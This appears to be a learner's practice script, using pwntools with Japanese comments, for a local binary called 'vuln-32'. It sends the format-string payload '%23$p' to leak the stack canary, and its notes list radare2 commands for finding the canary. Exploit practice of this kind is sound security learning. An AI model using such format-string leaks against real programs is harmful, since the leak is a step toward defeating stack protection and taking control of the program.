# checksec vuln-32
# linuxのカナリアは00で値が終わる
# espから64バイト加算したところ当たりにある?
# r2 -d -A vuln-32

# 大体%23$pで出てくる

from pwn import *

p = process('./vuln-32')

log.info(p.clean())
p.sendline('%23$p')

canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

# r2 -d -A vuln-32
# afl : 解析された関数の一覧を表示する
# pdf @ sym.vuln : vuln関数のアセンブリを表示
# db addr : ブレイクポイント
# dc : コンティニュー?

